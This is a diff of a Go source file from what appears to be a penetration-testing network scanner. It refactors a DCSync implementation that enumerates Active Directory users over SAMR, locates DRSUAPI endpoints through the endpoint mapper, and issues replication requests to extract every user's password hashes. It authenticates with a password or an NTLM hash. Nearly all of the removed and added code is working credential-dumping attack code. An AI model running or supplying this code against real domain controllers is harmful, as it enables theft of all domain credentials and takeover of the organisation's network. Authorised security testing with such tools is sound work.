+++ internal/pentest/msrpc/dcsync.go
@@ -2,342 +2,18 @@ package msrpc
 
 import (
 	"context"
-	"encoding/binary"
-	"encoding/hex"
-	"errors"
 	"fmt"
 	"strings"
 	"time"
 
 	msrpcfern "github.com/Method-Security/networkscan/generated/go/pentest/msrpc"
+	"github.com/Method-Security/networkscan/internal/protocol/msrpc"
 	"github.com/Method-Security/networkscan/utils"
-	"github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
-
-	"github.com/oiweiwei/go-msrpc/dcerpc"
-	drsuapi "github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
-	"github.com/oiweiwei/go-msrpc/msrpc/dcetypes"
-	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
-	epm "github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
-	"github.com/oiweiwei/go-msrpc/msrpc/erref/ntstatus"
-	samr "github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
-	"github.com/oiweiwei/go-msrpc/msrpc/well_known"
-	"github.com/oiweiwei/go-msrpc/ndr"
 	"github.com/oiweiwei/go-msrpc/ssp"
 	"github.com/oiweiwei/go-msrpc/ssp/credential"
 	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
-	"github.com/oiweiwei/go-msrpc/ssp/ntlm"
-	"github.com/oiweiwei/go-msrpc/midl/uuid"
-
+	"github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
 )
-
-// UserEntry represents a domain user with RID information for SID construction
-type UserEntry struct {
-	Username string
-	RID      uint32
-}
-
-// DomainInfo represents domain information including SID and users
-type DomainInfo struct {
-	DomainSID   *dtyp.SID
-	UserEntries []UserEntry
-}
-
-// Library-based endpoint mapper implementation
-
-// LibraryEndpointMapper implements the EndpointMapper interface
-type LibraryEndpointMapper struct {
-	Host        string
-	Credentials credential.Credential
-}
-
-// Map implements the EndpointMapper interface - queries EPM for DRSUAPI TCP endpoints using library
-func (m *LibraryEndpointMapper) Map(ctx context.Context, binding *dcerpc.Binding) ([]dcerpc.StringBinding, error) {
-	log := svc1log.FromContext(ctx)
-	log.Debug("LibraryEndpointMapper: querying EPM for DRSUAPI endpoints", svc1log.SafeParam("host", m.Host))
-
-	// Add credentials to GSSAPI context (following the example pattern)
-	gssapi.AddCredential(m.Credentials)
-	gssapi.AddMechanism(ssp.NTLM)
-	secCtx := gssapi.NewSecurityContext(ctx)
-
-	// Connect to EPM service using well_known.EndpointMapper() like the example
-	epmConn, err := dcerpc.Dial(secCtx, m.Host, well_known.EndpointMapper())
-	if err != nil {
-		log.Error("Failed to connect to EPM service", svc1log.SafeParam("error", err.Error()))
-		return nil, fmt.Errorf("failed to connect to EPM service: %w", err)
-	}
-	defer epmConn.Close(secCtx)
-
-	// Create EPM client with proper options like the example
-	epmClient, err := epm.NewEpmClient(secCtx, epmConn,
-		dcerpc.WithSeal(),
-		dcerpc.WithTargetName(m.Host),
-		dcerpc.WithVerifyBitMask(true),
-		dcerpc.WithVerifyPresentation(true),
-		dcerpc.WithVerifyHeader2(true))
-	if err != nil {
-		log.Error("Failed to create EPM client", svc1log.SafeParam("error", err.Error()))
-		return nil, fmt.Errorf("failed to create EPM client: %w", err)
-	}
-
-	// Build EPM tower for DRSUAPI lookup using library functions (following example pattern)
-	tower := m.buildDRSUAPITower()
-
-	// Query EPM using library's ept_map operation
-	mapResp, err := epmClient.Map(secCtx, &epm.MapRequest{
-		MapTower:    tower,
-		EntryHandle: &epm.LookupHandle{}, // Empty entry handle
-		MaxTowers:   4,                   // Request up to 4 towers
-	})
-	if err != nil {
-		log.Error("EPM Map request failed", svc1log.SafeParam("error", err.Error()))
-		return nil, fmt.Errorf("EPM map request failed: %w", err)
-	}
-
-	if mapResp.TowersLength == 0 {
-		log.Warn("EPM returned no towers for DRSUAPI")
-		return nil, fmt.Errorf("no DRSUAPI endpoints found via EPM")
-	}
-
-	log.Info("EPM returned towers", svc1log.SafeParam("towerCount", mapResp.TowersLength))
-
-	// Extract bindings from towers using library's Tower.Binding() method
-	var result []dcerpc.StringBinding
-	for i, tower := range mapResp.Towers {
-		if tower == nil {
-			continue
-		}
-
-		binding := tower.Binding()
-		if binding == nil {
-			log.Debug("Tower has no binding", svc1log.SafeParam("towerIndex", i))
-			continue
-		}
-
-		// Filter for TCP bindings
-		if binding.StringBinding.ProtocolSequence == dcerpc.ProtocolSequenceIPTCP {
-			// Override network address with our target host
-			binding.StringBinding.NetworkAddress = m.Host
-			result = append(result, binding.StringBinding)
-			log.Info("Found DRSUAPI TCP endpoint",
-				svc1log.SafeParam("endpoint", binding.StringBinding.Endpoint),
-				svc1log.SafeParam("protocol", binding.StringBinding.ProtocolSequence))
-		}
-	}
-
-	if len(result) == 0 {
-		return nil, fmt.Errorf("no TCP endpoints found for DRSUAPI")
-	}
-
-	return result, nil
-}
-
-// buildDRSUAPITower creates EPM tower for DRSUAPI lookup using library functions (following example pattern)
-func (m *LibraryEndpointMapper) buildDRSUAPITower() *dcetypes.Tower {
-	// Build tower following the example pattern in epm.go
-	drsuapiSyntax := drsuapi.DrsuapiSyntaxV4_0
-	return dcetypes.FloorsToTower([]*dcetypes.Floor{
-		// Floor 1: DRSUAPI Interface UUID
-		{
-			Protocol:     uint8(dcetypes.ProtocolUUID),
-			UUID:         drsuapiSyntax.IfUUID,
-			VersionMajor: drsuapiSyntax.IfVersionMajor,
-			Data:         []byte{0, 0}, // Minor version
-		},
-		// Floor 2: NDR Data Representation (using library constant)
-		{
-			Protocol:     uint8(dcetypes.ProtocolUUID),
-			UUID:         dcerpc.TransferNDR,
-			VersionMajor: 2, // NDR v2
-			Data:         binary.LittleEndian.AppendUint16(nil, drsuapiSyntax.IfVersionMinor),
-		},
-		// Floor 3: RPC Protocol
-		{
-			Protocol: uint8(dcetypes.ProtocolRPC_CO), // RPC connection-oriented
-			Data:     []byte{0, 0}, // Default RPC version
-		},
-		// Floor 4: TCP Protocol (port 0 = dynamic)
-		{
-			Protocol: uint8(dcetypes.ProtocolTCP), // TCP
-			Data:     []byte{0, 0}, // Port 0 (dynamic allocation)
-		},
-		// Floor 5: IP Address (0.0.0.0 = any)
-		{
-			Protocol: uint8(dcetypes.ProtocolIP), // IP
-			Data:     []byte{0, 0, 0, 0}, // IP 0.0.0.0 (any address)
-		},
-	})
-}
-
-// enumerateDomainUsers connects to SAMR and enumerates all users in the domain
-func enumerateDomainUsers(ctx context.Context, host string, cred credential.Credential, domain string) ([]string, error) {
-	log := svc1log.FromContext(ctx)
-
-	// Reuse existing GSSAPI context (credentials and mechanisms already set up)
-	secCtx := gssapi.NewSecurityContext(ctx)
-
-	// Connect to SAMR service using EPM endpoint mapper
-	conn, err := dcerpc.Dial(secCtx, host, epm.EndpointMapper(secCtx, host))
-	if err != nil {
-		return nil, fmt.Errorf("failed to connect to SAMR service: %w", err)
-	}
-	defer conn.Close(ctx)
-
-	// Create SAMR client
-	samrClient, err := samr.NewSamrClient(secCtx, conn, dcerpc.WithSeal())
-	if err != nil {
-		return nil, fmt.Errorf("failed to create SAMR client: %w", err)
-	}
-
-	// Connect to SAM server
-	serverHandle, err := samrClient.Connect(secCtx, &samr.ConnectRequest{
-		DesiredAccess: dtyp.AccessMaskGenericRead | dtyp.AccessMaskGenericExecute,
-	})
-	if err != nil {
-		return nil, fmt.Errorf("failed to connect to SAM server: %w", err)
-	}
-
-	// Look up the target domain
-	domainLookup, err := samrClient.LookupDomainInSAMServer(secCtx, &samr.LookupDomainInSAMServerRequest{
-		Server: serverHandle.Server,
-		Name:   &dtyp.UnicodeString{Buffer: domain},
-	})
-	if err != nil {
-		return nil, fmt.Errorf("failed to lookup domain %s: %w", domain, err)
-	}
-
-	// Open the domain
-	domainHandle, err := samrClient.OpenDomain(secCtx, &samr.OpenDomainRequest{
-		Server:        serverHandle.Server,
-		DesiredAccess: dtyp.AccessMaskGenericRead | dtyp.AccessMaskGenericExecute,
-		DomainID:      domainLookup.DomainID,
-	})
-	if err != nil {
-		return nil, fmt.Errorf("failed to open domain %s: %w", domain, err)
-	}
-
-	// Enumerate users in domain
-	var usernames []string
-	for enum := uint32(0); ; {
-		users, err := samrClient.EnumerateUsersInDomain(secCtx, &samr.EnumerateUsersInDomainRequest{
-			Domain:             domainHandle.Domain,
-			EnumerationContext: enum,
-		})
-		if err != nil {
-			if !errors.Is(err, ntstatus.StatusMoreEntries) {
-				return nil, fmt.Errorf("failed to enumerate users in domain: %w", err)
-			}
-		}
-
-		// Extract usernames from RID enumeration
-		for _, user := range users.Buffer.Buffer {
-			if user.Name != nil {
-				usernames = append(usernames, user.Name.Buffer)
-			}
-		}
-
-		// Continue enumeration if more entries exist
-		if enum = users.EnumerationContext; users.CountReturned == 0 || enum == 0 {
-			break
-		}
-	}
-
-	log.Info("Successfully enumerated domain users via SAMR",
-		svc1log.SafeParam("domain", domain),
-		svc1log.SafeParam("userCount", len(usernames)))
-
-	return usernames, nil
-}
-
-// enumerateDomainUsersWithRID connects to SAMR and enumerates all users with RID info
-func enumerateDomainUsersWithRID(ctx context.Context, host string, cred credential.Credential, domain string) (*DomainInfo, error) {
-	log := svc1log.FromContext(ctx)
-
-	// Reuse existing GSSAPI context (credentials and mechanisms already set up)
-	secCtx := gssapi.NewSecurityContext(ctx)
-
-	// Connect to SAMR service using EPM endpoint mapper
-	conn, err := dcerpc.Dial(secCtx, host, epm.EndpointMapper(secCtx, host))
-	if err != nil {
-		return nil, fmt.Errorf("failed to connect to SAMR service: %w", err)
-	}
-	defer conn.Close(ctx)
-
-	// Create SAMR client
-	samrClient, err := samr.NewSamrClient(secCtx, conn, dcerpc.WithSeal())
-	if err != nil {
-		return nil, fmt.Errorf("failed to create SAMR client: %w", err)
-	}
-
-	// Connect to SAM server
-	serverHandle, err := samrClient.Connect(secCtx, &samr.ConnectRequest{
-		DesiredAccess: dtyp.AccessMaskGenericRead | dtyp.AccessMaskGenericExecute,
-	})
-	if err != nil {
-		return nil, fmt.Errorf("failed to connect to SAM server: %w", err)
-	}
-
-	// Look up the target domain
-	domainLookup, err := samrClient.LookupDomainInSAMServer(secCtx, &samr.LookupDomainInSAMServerRequest{
-		Server: serverHandle.Server,
-		Name:   &dtyp.UnicodeString{Buffer: domain},
-	})
-	if err != nil {
-		return nil, fmt.Errorf("failed to lookup domain %s: %w", domain, err)
-	}
-
-	// Open the domain
-	domainHandle, err := samrClient.OpenDomain(secCtx, &samr.OpenDomainRequest{
-		Server:        serverHandle.Server,
-		DesiredAccess: dtyp.AccessMaskGenericRead | dtyp.AccessMaskGenericExecute,
-		DomainID:      domainLookup.DomainID,
-	})
-	if err != nil {
-		return nil, fmt.Errorf("failed to open domain %s: %w", domain, err)
-	}
-
-	// Enumerate users in domain with RID information
-	var userEntries []UserEntry
-	for enum := uint32(0); ; {
-		users, err := samrClient.EnumerateUsersInDomain(secCtx, &samr.EnumerateUsersInDomainRequest{
-			Domain:             domainHandle.Domain,
-			EnumerationContext: enum,
-		})
-		if err != nil {
-			if !errors.Is(err, ntstatus.StatusMoreEntries) {
-				return nil, fmt.Errorf("failed to enumerate users in domain: %w", err)
-			}
-		}
-
-		// Extract usernames and RIDs from RID enumeration
-		for _, user := range users.Buffer.Buffer {
-			if user.Name != nil {
-				userEntry := UserEntry{
-					Username: user.Name.Buffer,
-					RID:      user.RelativeID,
-				}
-				userEntries = append(userEntries, userEntry)
-			}
-		}
-
-		// Continue enumeration if more entries exist
-		if enum = users.EnumerationContext; users.CountReturned == 0 || enum == 0 {
-			break
-		}
-	}
-
-	log.Info("Successfully enumerated domain users with RIDs via SAMR",
-		svc1log.SafeParam("domain", domain),
-		svc1log.SafeParam("userCount", len(userEntries)))
-
-	// Return domain info with SID and user entries
-	domainInfo := &DomainInfo{
-		DomainSID:   domainLookup.DomainID,
-		UserEntries: userEntries,
-	}
-
-	return domainInfo, nil
-}
 
 // PerformDCSync executes a DCSync attack against the specified domain controller
 func PerformDCSync(ctx context.Context, config *msrpcfern.PentestMsrpcDcSyncConfig) (*msrpcfern.PentestMsrpcDcSyncResult, error) {
@@ -351,20 +27,7 @@ func PerformDCSync(ctx context.Context, config *msrpcfern.PentestMsrpcDcSyncConf
 	log.Info("Starting DCSync operation", svc1log.SafeParam("target", target))
 
 	// Extract domain from config or target
-	domain := ""
-	if config.Domain != nil && *config.Domain != "" {
-		domain = *config.Domain
-	} else {
-		// Try to extract domain from target hostname
-		parts := strings.Split(target, ":")
-		if len(parts) > 0 {
-			hostParts := strings.Split(parts[0], ".")
-			if len(hostParts) > 2 {
-				domain = strings.Join(hostParts[1:], ".")
-			}
-		}
-	}
-
+	domain := extractDomainName(target, config.Domain)
 	if domain == "" {
 		return nil, fmt.Errorf("unable to determine domain name from target or config")
 	}
@@ -405,13 +68,121 @@ func PerformDCSync(ctx context.Context, config *msrpcfern.PentestMsrpcDcSyncConf
 	return result, nil
 }
 
-// performDCSyncExtraction performs DCSync credential extraction using DRSUAPI
+// extractDomainName extracts domain name from config or target hostname
+func extractDomainName(target string, domainConfig *string) string {
+	if domainConfig != nil && *domainConfig != "" {
+		return *domainConfig
+	}
+
+	// Try to extract domain from target hostname
+	parts := strings.Split(target, ":")
+	if len(parts) > 0 {
+		hostParts := strings.Split(parts[0], ".")
+		if len(hostParts) > 2 {
+			return strings.Join(hostParts[1:], ".")
+		}
+	}
+
+	return ""
+}
+
+// performDCSyncExtraction performs DCSync credential extraction using protocol helpers
 func performDCSyncExtraction(ctx context.Context, config *msrpcfern.PentestMsrpcDcSyncConfig, result *msrpcfern.PentestMsrpcDcSyncResult) error {
 	log := svc1log.FromContext(ctx)
 
-	// Step 1: Validate credentials
+	// Validate and extract credentials
+	cred, err := setupAuthentication(config)
+	if err != nil {
+		return err
+	}
+
+	host, _ := utils.ParseHostPort(config.Targets[0], 445)
+	domain := *config.Domain
+
+	log.Debug("Connecting to domain controller for DCSync",
+		svc1log.SafeParam("host", host),
+		svc1log.SafeParam("domain", domain),
+		svc1log.SafeParam("username", config.Usernames[0]))
+
+	// Setup GSSAPI context
+	gssapi.AddCredential(cred)
+	gssapi.AddMechanism(ssp.NTLM)
+
+	// Step 1: Enumerate domain users using SAMR
+	samrClient := msrpc.NewSAMRClient(host, cred)
+	domainInfo, err := samrClient.EnumerateDomainUsers(ctx, domain)
+	if err != nil {
+		return fmt.Errorf("failed to enumerate domain users via SAMR: %w", err)
+	}
+
+	log.Info("Enumerated domain users for credential extraction",
+		svc1log.SafeParam("userCount", len(domainInfo.UserEntries)),
+		svc1log.SafeParam("domainSID", domainInfo.DomainSID.String()))
+
+	// Step 2: Discover DRSUAPI endpoints using EPM
+	endpointMapper := msrpc.NewEndpointMapper(host, cred)
+	drsuapiEndpoints, err := endpointMapper.DiscoverDRSUAPIEndpoints(ctx)
+	if err != nil {
+		return fmt.Errorf("failed to discover DRSUAPI endpoints: %w", err)
+	}
+
+	if len(drsuapiEndpoints) == 0 {
+		return fmt.Errorf("no DRSUAPI endpoints discovered via EPM")
+	}
+
+	// Use the first available TCP endpoint
+	drsuapiBinding := drsuapiEndpoints[0]
+	log.Info("Successfully discovered DRSUAPI endpoint",
+		svc1log.SafeParam("port", drsuapiBinding.Endpoint),
+		svc1log.SafeParam("protocol", drsuapiBinding.ProtocolSequence))
+
+	// Step 3: Connect to DRSUAPI service
+	drsuapiClient := msrpc.NewDRSUAPIClient(host, cred)
+	err = drsuapiClient.Connect(ctx, drsuapiBinding)
+	if err != nil {
+		return fmt.Errorf("failed to connect to DRSUAPI: %w", err)
+	}
+	defer func() {
+		if closeErr := drsuapiClient.Close(ctx); closeErr != nil {
+			log.Warn("Failed to close DRSUAPI connection", svc1log.SafeParam("error", closeErr.Error()))
+		}
+	}()
+
+	// Step 4: Bind to DRSUAPI service
+	err = drsuapiClient.Bind(ctx)
+	if err != nil {
+		return fmt.Errorf("failed to bind to DRSUAPI service: %w", err)
+	}
+	defer func() {
+		if unbindErr := drsuapiClient.Unbind(ctx); unbindErr != nil {
+			log.Warn("Failed to unbind from DRSUAPI service", svc1log.SafeParam("error", unbindErr.Error()))
+		}
+	}()
+
+	// Step 5: Extract credentials for all users
+	extractedUsers, successfulExtractions, failedExtractions, err := drsuapiClient.ExtractAllUserCredentials(ctx, domain, domainInfo, config)
+	if err != nil {
+		return fmt.Errorf("DCSync credential extraction failed: %w", err)
+	}
+
+	// Update result with extracted data
+	result.ExtractedUsers = extractedUsers
+	result.TotalUsers = len(domainInfo.UserEntries)
+	result.SuccessfulExtractions = successfulExtractions
+	result.FailedExtractions = failedExtractions
+
+	// Update result message
+	result.Message = fmt.Sprintf("DCSync operation completed via DRSUAPI. "+
+		"Successfully extracted %d users, failed %d extractions from domain %s.",
+		result.SuccessfulExtractions, result.FailedExtractions, domain)
+
+	return nil
+}
+
+// setupAuthentication configures authentication credentials from config
+func setupAuthentication(config *msrpcfern.PentestMsrpcDcSyncConfig) (credential.Credential, error) {
 	if len(config.Usernames) == 0 {
-		return fmt.Errorf("no username provided for authentication")
+		return nil, fmt.Errorf("no username provided for authentication")
 	}
 
 	// Check that either password or NTLM hash is provided
@@ -419,681 +190,24 @@ func performDCSyncExtraction(ctx context.Context, config *msrpcfern.PentestMsrpc
 	hasNtlmHash := config.NtlmHash != nil && *config.NtlmHash != ""
 
 	if !hasPassword && !hasNtlmHash {
-		return fmt.Errorf("DCSync requires either password or NTLM hash credentials")
+		return nil, fmt.Errorf("DCSync requires either password or NTLM hash credentials")
 	}
 
 	username := config.Usernames[0]
-	var password string
-	if hasPassword {
-		password = config.Passwords[0]
-	}
 	domain := *config.Domain
-	host, _ := utils.ParseHostPort(config.Targets[0], 445)
 
-	log.Debug("Connecting to domain controller for DCSync",
-		svc1log.SafeParam("host", host),
-		svc1log.SafeParam("domain", domain),
-		svc1log.SafeParam("username", username))
-
-	// Step 2: Set up authentication credentials with full domain FQDN
 	var cred credential.Credential
+
 	// Check for NTLM hash authentication first
-	if config.NtlmHash != nil && *config.NtlmHash != "" {
-		// Use NTLM hash authentication
+	if hasNtlmHash {
 		ntlmHash := *config.NtlmHash
-		log.Info("Using NTLM hash authentication for DCSync", svc1log.SafeParam("username", username))
 		cred = credential.NewFromNTHash(fmt.Sprintf("%s\\%s", domain, username), ntlmHash)
 	} else if hasPassword {
-		// Use traditional password authentication
+		password := config.Passwords[0]
 		cred = credential.NewFromPassword(fmt.Sprintf("%s\\%s", domain, username), password)
-	} else {
-		return fmt.Errorf("no password or NTLM hash provided for authentication")
 	}
 
-	// Step 3: Use endpoint mapper discovery approach
-	// Use endpoint mapper to discover DRSUAPI endpoints
-	log.Debug("Using endpoint mapper discovery")
+	// Note: NTLM configuration is handled internally by the credential system
 
-	// Use endpoint mapper to discover DRSUAPI port
-	// This connects to EPM service for discovery
-	log.Debug("Using endpoint mapper to discover DRSUAPI port")
-
-	// Create endpoint mapper for DRSUAPI discovery
-	endpointMapper := &LibraryEndpointMapper{
-		Host:        host,
-		Credentials: cred,
-	}
-
-	// Step 4: Discover DRSUAPI endpoints using library-based EPM query
-	binding := &dcerpc.Binding{
-		SyntaxID: dcerpc.SyntaxID{
-			IfUUID:           drsuapi.DrsuapiSyntaxUUID,
-			IfVersionMajor:   4,
-			IfVersionMinor:   0,
-		},
-	}
-
-	stringBindings, err := endpointMapper.Map(ctx, binding)
-	if err != nil {
-		log.Error("Failed to discover DRSUAPI endpoints", svc1log.SafeParam("error", err))
-		return fmt.Errorf("failed to discover DRSUAPI endpoints: %w", err)
-	}
-
-	if len(stringBindings) == 0 {
-		return fmt.Errorf("no DRSUAPI endpoints discovered via EPM")
-	}
-
-	// Use the first available TCP endpoint
-	drsuapiBinding := stringBindings[0]
-	drsuapiPort := drsuapiBinding.Endpoint
-	log.Info("Successfully discovered DRSUAPI port",
-		svc1log.SafeParam("port", drsuapiPort),
-		svc1log.SafeParam("protocol", drsuapiBinding.ProtocolSequence))
-
-	// Step 5: Create connection to DRSUAPI port
-	drsuapiTarget := fmt.Sprintf("ncacn_ip_tcp:%s[%s]", host, drsuapiPort)
-
-	// Configure NTLM with MIC and version support
-	ntlmConfig := &ntlm.Config{
-		RequestMIC: true,
-		Version: ntlm.Version{
-			ProductVersion: ntlm.Windows10,
-			ProductBuild:   19044,
-			Revision:       ntlm.RevisionCurrent,
-		},
-		TargetName:              host,
-		NoLMResponse:            true,
-		Require128BitEncryption: true,
-		NTLMVersion:             2,
-		Integrity:               true,
-		Confidentiality:         true,
-	}
-
-	conn, err := dcerpc.Dial(ctx, drsuapiTarget,
-		dcerpc.WithCredentials(cred),
-		dcerpc.WithMechanism(ssp.NTLM),
-		dcerpc.WithSecurityConfig(ntlmConfig),
-		dcerpc.WithSign(),
-		dcerpc.WithSeal(),
-		dcerpc.WithTargetName(host),
-	)
-	if err != nil {
-		log.Error("Failed to establish direct connection to DRSUAPI",
-			svc1log.SafeParam("target", drsuapiTarget),
-			svc1log.SafeParam("error", err.Error()))
-		return fmt.Errorf("failed to connect directly to DRSUAPI on %s: %w", drsuapiTarget, err)
-	}
-	defer conn.Close(ctx)
-
-	log.Info("Successfully established direct connection to DRSUAPI", svc1log.SafeParam("target", drsuapiTarget))
-
-	// Step 6: Create DRSUAPI client
-	client, err := drsuapi.NewDrsuapiClient(ctx, conn, dcerpc.WithSeal(), dcerpc.WithTargetName(host))
-	if err != nil {
-		log.Error("Failed to create DRSUAPI client", svc1log.SafeParam("error", err.Error()))
-		return fmt.Errorf("failed to create DRSUAPI client: %w", err)
-	}
-
-	log.Info("Successfully created DRSUAPI client")
-
-	log.Debug("Using connection for session key")
-
-	// Step 5: Create DRSBind request with required extensions
-	extensionFlags := uint32(drsuapi.ExtGetNCChangesRequestV6 |
-					 drsuapi.ExtGetNCChangesReplyV6 |
-					 drsuapi.ExtGetNCChangesRequestV8 |
-					 drsuapi.ExtStrongEncryption |
-					 drsuapi.ExtNonDomainNCs)
-
-	log.Debug("Using extension flags", svc1log.SafeParam("flags", fmt.Sprintf("0x%08x", extensionFlags)))
-
-	// Create extension structure
-	extensionsData := make([]byte, 32)
-
-	// Pack the extension flags in little-endian format
-	binary.LittleEndian.PutUint32(extensionsData[0:4], extensionFlags)
-
-	clientExtensions := &drsuapi.Extensions{
-		Length: 32,
-		Data:   extensionsData,
-	}
-
-	// NTDSAPI_CLIENT_GUID
-	clientGUID := &dtyp.UUID{
-		Data1: 0xe24d201a,
-		Data2: 0x4fd6,
-		Data3: 0x11d1,
-		Data4: []byte{0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d},
-	}
-
-	bindReq := &drsuapi.BindRequest{
-		ClientDSA: clientGUID,
-		Client:    clientExtensions,
-	}
-
-	bindResp, err := client.Bind(ctx, bindReq)
-	if err != nil {
-		log.Error("Failed to bind to DRSUAPI service", svc1log.SafeParam("error", err.Error()))
-		return fmt.Errorf("failed to bind to DRSUAPI service: %w", err)
-	}
-
-	log.Info("Successfully bound to DRSUAPI service")
-
-	// Step 7: Extract credentials for target users
-	err = extractCredentialsFromDRSUAPI(ctx, conn, client, bindResp.DRS, config, result, host, cred)
-	if err != nil {
-		log.Error("DCSync extraction failed", svc1log.SafeParam("error", err.Error()))
-		return fmt.Errorf("DCSync credential extraction failed: %w", err)
-	}
-
-	// Step 7: Unbind from service
-	unbindReq := &drsuapi.UnbindRequest{DRS: bindResp.DRS}
-	_, err = client.Unbind(ctx, unbindReq)
-	if err != nil {
-		log.Warn("Failed to unbind from DRSUAPI service", svc1log.SafeParam("error", err.Error()))
-	}
-
-	return nil
+	return cred, nil
 }
-
-// extractCredentialsFromDRSUAPI extracts credentials using DRSUAPI
-func extractCredentialsFromDRSUAPI(ctx context.Context, conn dcerpc.Conn, client drsuapi.DrsuapiClient, handle *drsuapi.Handle, config *msrpcfern.PentestMsrpcDcSyncConfig, result *msrpcfern.PentestMsrpcDcSyncResult, host string, cred credential.Credential) error {
-	log := svc1log.FromContext(ctx)
-
-	// Using DRSUAPI session-based decryption
-	log.Info("Using DRSUAPI session-based hash decryption")
-
-	// Enumerate all domain users using SAMR with RID info
-	log.Info("Enumerating domain users via SAMR")
-	domainInfo, err := enumerateDomainUsersWithRID(ctx, host, cred, *config.Domain)
-	if err != nil {
-		return fmt.Errorf("failed to enumerate domain users via SAMR: %w", err)
-	}
-	log.Info("Using domain user list for credential extraction",
-		svc1log.SafeParam("userCount", len(domainInfo.UserEntries)),
-		svc1log.SafeParam("domainSID", domainInfo.DomainSID.String()))
-
-	log.Debug("Starting DCSync credential extraction",
-		svc1log.SafeParam("userCount", len(domainInfo.UserEntries)),
-		svc1log.SafeParam("domain", *config.Domain))
-
-	for _, userEntry := range domainInfo.UserEntries {
-		result.TotalUsers++
-
-		// No user skipping in unified auth mode
-
-		username := userEntry.Username
-		userRID := userEntry.RID
-
-		// Extract credentials for user
-
-		// Special handling for Guest account
-		if username == "Guest" {
-			// Guest accounts may have empty passwords
-		}
-
-		// Construct user SID from domain SID + RID
-		userSID := *domainInfo.DomainSID
-		userSID.SubAuthority = append(userSID.SubAuthority, userRID)
-		userSID.SubAuthorityCount++
-
-		// Construct user SID from domain SID + RID
-
-		// Convert dtyp.SID to drsuapi.NT4SID
-		sidBytes, err := userSID.Bytes()
-		if err != nil {
-			log.Error("Failed to encode user SID",
-				svc1log.SafeParam("username", username),
-				svc1log.SafeParam("error", err.Error()))
-			result.FailedExtractions++
-			continue
-		}
-
-		nt4sid := &drsuapi.NT4SID{
-			Data: sidBytes,
-		}
-
-		// Try SID-based approach first
-		// Use GetNCChanges with SID directly instead of CrackNames
-		getChangesReq := &drsuapi.GetNCChangesRequest{
-			Handle:    handle,
-			InVersion: 8,
-			In: &drsuapi.MessageGetNCChangesRequest{
-				Value: &drsuapi.MessageGetNCChangesRequest_V8{
-					V8: &drsuapi.MessageGetNCChangesRequestV8{
-						DSAObjectDestination:      &dtyp.UUID{},
-						InvocationIDSource:        &dtyp.UUID{},
-						NC:                        &drsuapi.DSName{SID: nt4sid},
-						From:                      &drsuapi.Vector{},
-						UpToDateVectorDestination: nil,
-						Flags:                     drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
-						MaxObjectsCount:           1,
-						MaxBytesCount:             0,
-						ExtendedOperation:         drsuapi.ExtendedOperationReplicationObject,
-						FSMOInfo:                  nil,
-					},
-				},
-			},
-		}
-
-		getChangesResp, err := client.GetNCChanges(ctx, getChangesReq)
-		if err != nil {
-			// SID-based approach failed, try CrackNames fallback
-
-			// Fallback to CrackNames approach
-			crackedReq := &drsuapi.CrackNamesRequest{
-				Handle:    handle,
-				InVersion: 1,
-				In: &drsuapi.MessageCrackNamesRequest{
-					Value: &drsuapi.MessageCrackNamesRequest_V1{
-						V1: &drsuapi.MessageCrackNamesRequestV1{
-							FormatOffered: uint32(drsuapi.DSNameFormatSIDOrSIDHistoryName),
-							FormatDesired: uint32(drsuapi.DSNameFormatUniqueIDName),
-							Names:         []string{userSID.String()},
-						},
-					},
-				},
-			}
-
-			crackedResp, err := client.CrackNames(ctx, crackedReq)
-			if err != nil {
-				log.Warn("Failed to crack name for user",
-					svc1log.SafeParam("username", username),
-					svc1log.SafeParam("error", err.Error()))
-				result.FailedExtractions++
-				continue
-			}
-
-			v1Reply, ok := crackedResp.Out.Value.(*drsuapi.MessageCrackNamesReply_V1)
-			if crackedResp.OutVersion != 1 || crackedResp.Out == nil || !ok || v1Reply.V1 == nil || v1Reply.V1.Result == nil || len(v1Reply.V1.Result.Items) == 0 || v1Reply.V1.Result.Items[0].Status != uint32(drsuapi.DSNameErrorNoError) {
-				log.Warn("User not found in directory via CrackNames fallback",
-					svc1log.SafeParam("username", username),
-					svc1log.SafeParam("status", "unknown"))
-				result.FailedExtractions++
-				continue
-			}
-
-			// Extract GUID from cracked name and retry GetNCChanges
-			crackedItem := v1Reply.V1.Result.Items[0]
-			userGUID := crackedItem.Name
-
-			// Successfully resolved user GUID via CrackNames
-
-			// Retry GetNCChanges with GUID
-			getChangesReq = &drsuapi.GetNCChangesRequest{
-				Handle:    handle,
-				InVersion: 8,
-				In: &drsuapi.MessageGetNCChangesRequest{
-					Value: &drsuapi.MessageGetNCChangesRequest_V8{
-						V8: &drsuapi.MessageGetNCChangesRequestV8{
-							MaxObjectsCount: 1,
-							NC: &drsuapi.DSName{
-								GUID: dtyp.GUIDFromUUID(uuid.MustParse(userGUID)),
-							},
-							Flags:             drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
-							ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
-							FSMOInfo:          nil,
-						},
-					},
-				},
-			}
-
-			getChangesResp, err = client.GetNCChanges(ctx, getChangesReq)
-			if err != nil {
-				log.Error("Failed to get replication data for user via fallback",
-					svc1log.SafeParam("username", username),
-					svc1log.SafeParam("error", err.Error()))
-				result.FailedExtractions++
-				continue
-			}
-		}
-
-		// At this point, getChangesResp should be populated from either SID or fallback approach
-
-		// Extract credentials from the replication response
-		userEntry, err := extractUserCredentials(ctx, conn, client, username, *config.Domain, getChangesResp, config)
-		if err != nil {
-			log.Error("Failed to extract credentials from replication data",
-				svc1log.SafeParam("username", username),
-				svc1log.SafeParam("error", err.Error()))
-			result.FailedExtractions++
-			continue
-		}
-
-		if userEntry != nil {
-			result.ExtractedUsers = append(result.ExtractedUsers, userEntry)
-			result.SuccessfulExtractions++
-			// Successfully extracted user credentials
-		} else {
-			result.FailedExtractions++
-		}
-
-		// Continue with full domain dump (no batch size limits in unified auth mode)
-	}
-
-	// Update result message
-	result.Message = fmt.Sprintf("DCSync operation completed via DRSUAPI. "+
-		"Successfully extracted %d users, failed %d extractions from domain %s.",
